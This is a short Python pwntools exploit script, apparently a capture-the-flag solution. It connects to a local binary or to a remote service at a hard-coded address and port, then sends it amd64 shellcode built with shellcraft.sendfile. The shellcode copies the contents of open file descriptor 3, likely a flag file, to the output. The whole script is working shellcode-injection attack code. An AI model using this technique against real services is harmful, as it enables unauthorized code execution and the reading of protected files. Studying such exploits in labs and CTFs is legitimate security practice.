from pwn import *

REMOTE = False
context.arch = 'amd64'

if REMOTE:
    r = remote('100.90.0.178', 30001)
else:
    r = process('./main')

shellcode = asm(shellcraft.sendfile(1, 3, 0, 512))
r.send(shellcode)

r.interactive()
